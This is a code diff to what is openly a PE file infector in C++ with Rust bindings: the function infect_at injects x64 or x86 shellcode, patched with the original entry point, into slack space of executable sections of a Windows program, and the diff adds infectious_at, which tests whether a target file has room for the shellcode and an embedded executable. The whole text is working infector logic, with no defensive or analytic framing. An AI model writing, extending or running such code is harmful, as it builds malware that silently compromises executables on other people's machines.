@@ -120,6 +120,10 @@ bool infect_at(rust::String target, rust::String exe) {
   size_t shellcode_size = 0;
   BYTE *shellcode = nullptr;
 
+  if (buffer == nullptr) {
+    throw AppError("failed to load the target file");
+  }
+
   // It seems that the infection check is not needed here, as we are overwriting
   // previous infection.
   // if (infected(buffer, buf_size) == true) {
@@ -132,17 +136,17 @@ bool infect_at(rust::String target, rust::String exe) {
   auto machine = peconv::get_file_hdr(buffer, buf_size)->Machine;
 
   if (machine == IMAGE_FILE_MACHINE_AMD64) {
-    prepare_shellcode(shellcode_x64, sizeof(shellcode_x64), oep_rva);
     shellcode = shellcode_x64;
     shellcode_size = sizeof(shellcode_x64);
   } else if (machine == IMAGE_FILE_MACHINE_I386) {
-    prepare_shellcode(shellcode_x86, sizeof(shellcode_x86), oep_rva);
     shellcode = shellcode_x86;
     shellcode_size = sizeof(shellcode_x86);
   } else {
     peconv::free_file(buffer);
     throw AppError("unsupported machine type");
   }
+
+  prepare_shellcode(shellcode, shellcode_size, oep_rva);
 
   for (size_t i = 0; i < sec_num; i++) {
     auto hdr = peconv::get_section_hdr(buffer, buf_size, i);
@@ -167,4 +171,38 @@ bool infect_at(rust::String target, rust::String exe) {
   }
   peconv::free_file(buffer);
   return modified;
+}
+
+bool infectious_at(rust::String target, rust::String exe) {
+  size_t buf_size = 0;
+  auto buffer = peconv::load_file(target.c_str(), buf_size);
+  size_t shellcode_size = 0;
+
+  if (buffer == nullptr) {
+    throw AppError("failed to load the target file");
+  }
+
+  auto sec_num = peconv::get_sections_count(buffer, buf_size);
+  auto machine = peconv::get_file_hdr(buffer, buf_size)->Machine;
+
+  if (machine == IMAGE_FILE_MACHINE_AMD64) {
+    shellcode_size = sizeof(shellcode_x64);
+  } else if (machine == IMAGE_FILE_MACHINE_I386) {
+    shellcode_size = sizeof(shellcode_x86);
+  } else {
+    peconv::free_file(buffer);
+    throw AppError("unsupported machine type");
+  }
+
+  for (size_t i = 0; i < sec_num; i++) {
+    auto hdr = peconv::get_section_hdr(buffer, buf_size, i);
+    auto remaining =
+        (int64_t)hdr->SizeOfRawData - (int64_t)hdr->Misc.VirtualSize;
+    if (remaining > shellcode_size + exe.size() &&
+        hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
+      return true;
+    }
+  }
+
+  return false;
 }
